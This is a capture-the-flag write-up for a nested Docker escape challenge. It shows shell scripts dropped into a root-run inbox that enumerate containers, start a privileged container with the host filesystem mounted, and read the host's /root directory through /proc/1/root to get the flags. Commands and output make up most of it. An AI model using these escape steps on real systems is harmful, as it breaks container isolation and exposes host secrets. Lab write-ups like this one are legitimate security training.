/var/lib/docker/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/vfs/dir/da711eeb314349695bd5778b90c1d6ce9dca3476fef16b237210834443af3869-init/usr/lib/bash/fdflags
/var/lib/docker/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/vfs/dir/da711eeb314349695bd5778b90c1d6ce9dca3476fef16b237210834443af3869/usr/lib/bash/fdflags
/var/lib/docker/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/vfs/dir/f25b5f8a9f1a37cc9fb16d0e617a14cc38c3c4c7a285d86026c7b845af315a75-init/usr/lib/bash/fdflags
/var/lib/docker/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/vfs/dir/9a4039011096939c1da143ad088ca0a41af25c83a4a55b7975b4303de73a20f6/usr/lib/bash/fdflags
/var/lib/docker/volumes/057c0a3407141d11603240984b86107fdb8b9972a48ff7db6ff5971b937d6302/_data/vfs/dir/61ccdb05fa05c412d2ad553a3cb33e13153335487c40b1c9c44d261bf5388297/usr/lib/bash/fdflags
```
- Got the Flag Directory - `/root/flag_level3.txt`
---- 
Second Docker 
```bash
 # cat > /mnt/level3share/inbox/finalflag.sh << 'EOF'
> #!/bin/sh
> cat /root/flag_level3.txt
> EOF
/ # cat /mnt/level3share/outbox/finalflag.sh.out
[flag omitted]
```
## Docker Level 3
- Enumeration
```bash
 cat > /mnt/level3share/inbox/ps.sh <<< 'EOF'
> #!/bin/sh
> docker ps -a
> EOF
/ # cat /mnt/level3share/outbox/ps.sh.out
CONTAINER ID   IMAGE                     COMMAND                  CREATED          STATUS          PORTS           NAMES
613a37677f10   matryoshka-level2:local   "/usr/local/bin/leve…"   49 minutes ago   Up 49 minutes   2375-2376/tcp   level2

/mnt/level3share/outbox # cat > /mnt/level3share/inbox/hostescape.sh << 'EOF'
> #!/bin/sh
>
> docker run --rm -u 0 --privileged -v /:/host \
> matryoshka-level2:local \
> sh -c 'hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null'
>
> EOF
/mnt/level3share/outbox # cat /mnt/level3share/outbox/hostescape.sh.out
/mnt/level3share/outbox # cat > /mnt/level3share/inbox/hostescape2.sh << 'EOF'
> #!/bin/sh
>
> echo "[*] START"
```
- Look More
```bash
cat > /mnt/level3share/inbox/ns.sh << 'EOF'
#!/bin/sh
echo "=== PS ==="
ps auxww
echo "=== NS ==="
lsns
EOF

$ cat ns.sh.out
=== PS ===
PID   USER     TIME  COMMAND
    1 root      0:04 {systemd} /sbin/init
    2 root      0:00 [kthreadd]
    3 root      0:00 [pool_workqueue_]
    4 root      0:00 [kworker/R-rcu_g]
    5 root      0:00 [kworker/R-sync_]
    6 root      0:00 [kworker/R-kvfre]
    7 root      0:00 [kworker/R-slub_]
    8 root      0:00 [kworker/R-netns]
   10 root      0:00 [kworker/0:0H-ev]
   13 root      0:00 [kworker/R-mm_pe]
   14 root      0:00 [ksoftirqd/0]
   15 root      0:00 [rcu_sched]
   16 root      0:00 [rcu_exp_par_gp_]
   17 root      0:00 [rcu_exp_gp_kthr]
   18 root      0:00 [migration/0]
   19 root      0:00 [idle_inject/0]
   20 root      0:00 [cpuhp/0]
   21 root      0:00 [cpuhp/1]
   22 root      0:00 [idle_inject/1]
   23 root      0:00 [migration/1]
   24 root      0:00 [ksoftirqd/1]
   26 root      0:00 [kworker/1:0H-ev]
   27 root      0:00 [kdevtmpfs]
   28 root      0:00 [kworker/R-inet_]
   29 root      0:00 [rcu_tasks_rude_]
   30 root      0:00 [rcu_tasks_trace]
   31 root      0:00 [kauditd]
   32 root      0:00 [khungtaskd]
   34 root      0:00 [oom_reaper]
   35 root      0:00 [kworker/R-write]
   37 root      0:00 [kcompactd0]
   38 root      0:00 [ksmd]
   39 root      0:00 [khugepaged]
   40 root      0:00 [kworker/R-kbloc]
   41 root      0:00 [kworker/R-blkcg]
   42 root      0:00 [kworker/R-kinte]
   43 root      0:00 [irq/9-acpi]
   45 root      0:00 [kworker/R-tpm_d]
   46 root      0:00 [kworker/R-ata_s]
   47 root      0:00 [kworker/R-md]
   48 root      0:00 [kworker/R-md_bi]
   49 root      0:00 [kworker/R-edac-]
   50 root      0:00 [kworker/R-devfr]
   51 root      0:00 [watchdogd]
   52 root      0:00 [kworker/R-quota]
   53 root      0:00 [kworker/0:1H-kb]
   54 root      0:00 [kswapd0]
   55 root      0:00 [ecryptfs-kthrea]
   56 root      0:00 [kworker/R-kthro]
   57 root      0:00 [kworker/R-acpi_]
   58 root      0:00 [kworker/R-nvme-]
   59 root      0:00 [kworker/R-nvme-]
   60 root      0:00 [kworker/R-nvme-]
   61 root      0:00 [kworker/R-nvme-]
   63 root      0:00 [kworker/0:2-eve]
   64 root      0:00 [kworker/R-mld]
   65 root      0:00 [kworker/1:1H-kb]
   66 root      0:00 [kworker/R-ipv6_]
   67 root      0:00 [kworker/R-kstrp]
   69 root      0:00 [kworker/u9:0]
   80 root      0:00 [kworker/R-charg]
   81 root      0:00 [jbd2/nvme0n1p1-]
   82 root      0:00 [kworker/R-ext4-]
  121 root      0:01 /usr/lib/systemd/systemd-journald
  159 root      0:00 [kworker/R-kmpat]
  161 root      0:00 [kworker/R-kmpat]
  173 root      0:00 /sbin/multipathd -d -s
  184 root      0:00 /usr/lib/systemd/systemd-udevd
  194 root      0:00 [psimon]
  225 root      0:00 [kworker/u8:4-fl]
  233 root      0:00 [kworker/u8:8-ev]
  285 root      0:00 [kworker/R-ena]
  339 root      0:00 [kworker/1:4-eve]
  477 101       0:00 /usr/lib/systemd/systemd-resolved
  480 102       0:00 /usr/lib/systemd/systemd-timesyncd
  595 dockrema  0:00 /usr/lib/systemd/systemd-networkd
  651 root      0:00 /usr/sbin/acpid
  654 root      0:00 /usr/sbin/cron -f -P
  655 103       0:00 {dbus-daemon} @dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only
  661 root      0:01 /snap/amazon-ssm-agent/13009/amazon-ssm-agent
  665 root      0:00 /usr/lib/snapd/snapd
  667 root      0:00 /usr/lib/systemd/systemd-logind
  678 root      0:00 /sbin/agetty -o -p -- \u --keep-baud 115200,57600,38400,9600 - vt220
  682 root      0:00 /sbin/agetty -o -p -- \u --noclear - linux
  696 root      0:00 sshd: /usr/sbin/sshd -D -o AuthorizedKeysCommand /usr/share/ec2-instance-connect/eic_run_authorized_keys %u %f -o AuthorizedKeysCommandUser ec2-instance-connect [listener] 0 of 10-100 startups
  712 root      0:03 /usr/bin/containerd
  748 root      0:00 {unattended-upgr} /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal
  814 104       0:00 /usr/sbin/rsyslogd -n -iNONE
  815 997       0:00 /usr/lib/polkit-1/polkitd --no-debug
 1105 root      0:02 /snap/amazon-ssm-agent/13009/ssm-agent-worker
 1133 root      0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
 1346 root      0:00 /usr/bin/docker run --name level3 --privileged --pid=host --restart unless-stopped --env-file /etc/matryoshka.env --pull=never matryoshka-level3:latest
 1370 root      0:02 /usr/bin/containerd-shim-runc-v2 -namespace moby -id 985f8e64df7194b7cd5226727f149a16645fff9857a810ef1a4add45fc5c1d95 -address /run/containerd/containerd.sock
 1395 root      0:00 {level3-entrypoi} /bin/sh /usr/local/bin/level3-entrypoint.sh
 1425 root      0:00 [kworker/R-tls-s]
 1426 root      0:00 docker-init -- dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem
 1535 root      0:00 [psimon]
 1575 root      0:00 [kworker/R-ib-co]
 1576 root      0:00 [kworker/R-ib-co]
 1577 root      0:00 [kworker/R-ib_mc]
 1578 root      0:00 [kworker/R-ib_nl]
 1628 root      0:05 dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem
 1675 root      0:06 containerd --config /var/run/docker/containerd/containerd.toml
 1980 root      0:00 {runner.sh} /bin/sh /usr/local/bin/runner.sh
 2150 root      0:01 /usr/local/bin/containerd-shim-runc-v2 -namespace moby -id 613a37677f103b772e57dbbfaeb5a3699eb7a12d52891f015a8199cfe5f15abe -address /var/run/docker/containerd/containerd.sock
 2169 root      0:00 {level2-entrypoi} /bin/sh /usr/local/bin/level2-entrypoint.sh
 2191 root      0:00 docker-init -- dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem --storage-driver=vfs
 2197 root      0:00 tail -f /dev/null
 2272 root      0:08 dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem --storage-driver=vfs
 2280 root      0:07 containerd --config /var/run/docker/containerd/containerd.toml
 2484 root      0:01 /usr/local/bin/containerd-shim-runc-v2 -namespace moby -id c52a2720a7413232f345c44b79087fe120e6941f886df4bf2199ffe81eeb9928 -address /var/run/docker/containerd/containerd.sock
 2506 1000      0:00 sleep infinity
 2528 root      0:00 tail -f /dev/null
 2545 root      0:00 sshd: matryoshka [priv]
 2568 1001      0:00 /usr/lib/systemd/systemd --user
 2569 1001      0:00 (sd-pam)
 2634 1001      0:02 sshd: matryoshka@pts/0
 2635 root      0:00 sudo -n /usr/local/sbin/matryoshka_attach
 2636 root      0:00 sudo -n /usr/local/sbin/matryoshka_attach
 2637 root      0:00 /usr/bin/docker exec -it level3 /usr/local/bin/attach_level1.sh
 2664 root      0:00 docker exec -it level2 /usr/local/bin/attach_level1.sh
 2686 root      0:00 docker exec -it level1 /bin/bash
 2709 1000      0:00 /bin/bash
 3163 root      0:00 [kworker/1:0-eve]
 4190 1000      0:00 docker run -it --rm --privileged --pid=host --net=host --ipc=host --uts=host -u 0 -v /:/host matryoshka-level1:local sh
 4205 root      0:01 /usr/local/bin/containerd-shim-runc-v2 -namespace moby -id ab56057d00dd1821398d929ddfeb99c1d1b0fb60ca062ba6d35b2110ddcdd6ad -address /var/run/docker/containerd/containerd.sock
 4225 root      0:00 sh
 4263 root      0:00 sh
 4602 root      0:00 [kworker/0:0-eve]
 5345 root      0:00 [kworker/u8:1-fl]
 5629 root      0:00 [kworker/u8:0-fl]
 5740 root      0:00 docker run --rm -u 0 --privileged -v /:/host matryoshka-level2:local sh -c hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null
 5756 root      0:00 /usr/local/bin/containerd-shim-runc-v2 -namespace moby -id ed898150e6768de5d488c2c9332d858bb0e9939e3e5d1faeed492901d42e0adf -address /var/run/docker/containerd/containerd.sock
 5777 root      0:00 {level2-entrypoi} /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null
 5797 root      0:00 docker-init -- dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem --storage-driver=vfs
 5929 root      0:01 dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem --storage-driver=vfs
 5936 root      0:00 containerd --config /var/run/docker/containerd/containerd.toml
 6144 root      0:00 /usr/local/bin/containerd-shim-runc-v2 -namespace moby -id d1c05f67258d32bf33c58a2481fe4fb6c9f2be7f3f75fc3913fb11e7547d47b7 -address /var/run/docker/containerd/containerd.sock
 6164 1000      0:00 sleep infinity
 6185 root      0:00 tail -f /dev/null
 6213 root      0:00 [kworker/u8:2-fl]
 6229 root      0:00 docker run --rm -u 0 --privileged -v /:/host matryoshka-level2:local sh -c echo INSIDE; hostname; id; ls -la /host/root; find /host -iname "*flag*" 2>/dev/null
 6234 root      0:00 [kworker/u8:3-ev]
 6246 root      0:00 /usr/local/bin/containerd-shim-runc-v2 -namespace moby -id 84bba9b23dd2084dc07e18415dd5309e3c46b760fe019395b0290ca0d34da5bc -address /var/run/docker/containerd/containerd.sock
 6266 root      0:00 {level2-entrypoi} /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c echo INSIDE; hostname; id; ls -la /host/root; find /host -iname "*flag*" 2>/dev/null
 6288 root      0:00 docker-init -- dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem --storage-driver=vfs
 6390 root      0:01 dockerd --host=unix:///var/run/docker.sock --host=tcp://0.0.0.0:2376 --tlsverify --tlscacert /certs/server/ca.pem --tlscert /certs/server/cert.pem --tlskey /certs/server/key.pem --storage-driver=vfs
 6398 root      0:00 containerd --config /var/run/docker/containerd/containerd.toml
 6514 root      0:00 [kworker/1:1-eve]
 6607 root      0:00 /usr/local/bin/containerd-shim-runc-v2 -namespace moby -id 1ab7403619160dd5c365074c00cff56af10004e1521a1d550418a1898b6e8fa9 -address /var/run/docker/containerd/containerd.sock
 6626 1000      0:00 sleep infinity
 6650 root      0:00 tail -f /dev/null
 6925 root      0:00 {runner.sh} /bin/sh /usr/local/bin/runner.sh
 6926 root      0:00 sleep 2
 6927 root      0:00 timeout 15 /bin/sh /tmp/runner_ns.sh
 6928 root      0:00 /bin/sh /tmp/runner_ns.sh
 6929 root      0:00 ps auxww
=== NS ===
        NS TYPE   NPROCS   PID USER      COMMAND
4026531832 mnt       106     1 root      /sbin/init
4026531833 net       113     1 root      /sbin/init
4026531834 time      157     1 root      /sbin/init
4026531835 cgroup    113     1 root      /sbin/init
4026531836 pid       130     1 root      /sbin/init
4026531837 user      157     1 root      /sbin/init
4026531838 uts       108     1 root      /sbin/init
4026531839 ipc       113     1 root      /sbin/init
4026532198 mnt         1   184 root      ├─/usr/lib/systemd/systemd-udevd
4026532199 uts         1   184 root      ├─/usr/lib/systemd/systemd-udevd
4026532210 mnt         1   477 101       ├─/usr/lib/systemd/systemd-resolved
4026532211 mnt         1   480 102       ├─/usr/lib/systemd/systemd-timesyncd
4026532212 uts         1   480 102       ├─/usr/lib/systemd/systemd-timesyncd
4026532221 mnt         1   595 dockremap ├─/usr/lib/systemd/systemd-networkd
4026532234 uts         1   667 root      ├─/usr/lib/systemd/systemd-logind
4026532235 uts         1   814 104       ├─/usr/sbin/rsyslogd -n -iNONE
4026532236 mnt         1   815 997       ├─/usr/lib/polkit-1/polkitd --no-debug
4026532237 uts         1   815 997       ├─/usr/lib/polkit-1/polkitd --no-debug
4026532293 mnt         1   667 root      └─/usr/lib/systemd/systemd-logind
4026531860 mnt         1    27 root      kdevtmpfs
4026532242 mnt        17  1395 root      /bin/sh /usr/local/bin/level3-entrypoint.sh
4026532243 uts        17  1395 root      /bin/sh /usr/local/bin/level3-entrypoint.sh
4026532244 ipc        17  1395 root      /bin/sh /usr/local/bin/level3-entrypoint.sh
4026532245 cgroup     25  1395 root      /bin/sh /usr/local/bin/level3-entrypoint.sh
4026532246 net        17  1395 root      /bin/sh /usr/local/bin/level3-entrypoint.sh
4026532309 mnt         8  2169 root      /bin/sh /usr/local/bin/level2-entrypoint.sh
4026532310 uts        10  2169 root      /bin/sh /usr/local/bin/level2-entrypoint.sh
4026532311 ipc        10  2169 root      /bin/sh /usr/local/bin/level2-entrypoint.sh
4026532312 pid        10  2169 root      /bin/sh /usr/local/bin/level2-entrypoint.sh
4026532313 net        10  2169 root      /bin/sh /usr/local/bin/level2-entrypoint.sh
4026532372 mnt         3  2506 1000      sleep infinity
4026532373 uts         3  2506 1000      sleep infinity
4026532374 ipc         3  2506 1000      sleep infinity
4026532375 pid         3  2506 1000      sleep infinity
4026532376 net         3  2506 1000      sleep infinity
4026532434 cgroup      3  2506 1000      sleep infinity
4026532435 mnt         2  4225 root      sh
4026532436 cgroup      2  4225 root      sh
4026532439 mnt         6  5777 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null
4026532440 uts         6  5777 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null
4026532441 ipc         6  5777 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null
4026532442 pid         6  5777 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null
4026532443 net         6  5777 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null
4026532501 cgroup      6  5777 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c hostname; id; ls /host/root; find /host -iname "*flag*" 2>/dev/null
4026532503 mnt         1  6164 1000      sleep infinity
4026532504 uts         1  6164 1000      sleep infinity
4026532505 ipc         1  6164 1000      sleep infinity
4026532506 pid         1  6164 1000      sleep infinity
4026532507 net         1  6164 1000      sleep infinity
4026532565 cgroup      1  6164 1000      sleep infinity
4026532568 mnt         6  6266 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c echo INSIDE; hostname; id; ls -la /host/root; find /host -iname "*flag*" 2>/dev/null
4026532569 uts         6  6266 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c echo INSIDE; hostname; id; ls -la /host/root; find /host -iname "*flag*" 2>/dev/null
4026532570 ipc         6  6266 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c echo INSIDE; hostname; id; ls -la /host/root; find /host -iname "*flag*" 2>/dev/null
4026532571 pid         6  6266 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c echo INSIDE; hostname; id; ls -la /host/root; find /host -iname "*flag*" 2>/dev/null
4026532572 net         6  6266 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c echo INSIDE; hostname; id; ls -la /host/root; find /host -iname "*flag*" 2>/dev/null
4026532630 cgroup      6  6266 root      /bin/sh /usr/local/bin/level2-entrypoint.sh sh -c echo INSIDE; hostname; id; ls -la /host/root; find /host -iname "*flag*" 2>/dev/null
4026532632 mnt         1  6626 1000      sleep infinity
4026532633 uts         1  6626 1000      sleep infinity
4026532634 ipc         1  6626 1000      sleep infinity
4026532635 pid         1  6626 1000      sleep infinity
4026532636 net         1  6626 1000      sleep infinity
4026532694 cgroup      1  6626 1000      sleep infinity
/mnt/level3share/outbox #
```
- Found - `PID 1 = /sbin/init`
- which that means the Level3 container is running with: `--pid=host`
- So Now, Now abuse `/proc/1/root`. 
- REAL Host systemd - `/proc/1/root`
----
Third Docker Out and final flag
```bash
cat > /mnt/level3share/inbox/realhost.sh <<< 'EOF'
> #!/bin/sh
>
> echo "=== HOST ROOT ==="
> ls -la /proc/1/root/root
>
> echo "=== FLAGS ==="
> find /proc/1/root -iname "*flag*" 2>/dev/null
>
> echo "=== FINAL ==="
> cat /proc/1/root/root/* 2>/dev/null
>
> EOF
/mnt/level3share/outbox # cat /mnt/level3share/outbox/realhost.sh.out
=== HOST ROOT ===
total 40
drwx------  5 root root 4096 May  4 16:54 .
drwxr-xr-x 22 root root 4096 May  8 22:43 ..
-rw-------  1 root root  391 May  8 06:08 .bash_history
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
-rw-------  1 root root   20 May  4 16:54 .lesshst
drwxr-xr-x  3 root root 4096 Oct 22  2024 .local
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Oct 22  2024 .ssh
-r--------  1 root root   16 May  4 14:06 flag_host.txt
drwxr-xr-x  4 root root 4096 Oct 22  2024 snap
=== FLAGS ===
=== FINAL ===
[flag omitted]
/mnt/level3share/outbox #
```
- All Flags
---- 
## `Flags`
```bash
Docker - Level 2 - [flag omitted]
Docker - Level 3 - [flag omitted]
Docker -  Final  - [flag omitted]
```
# END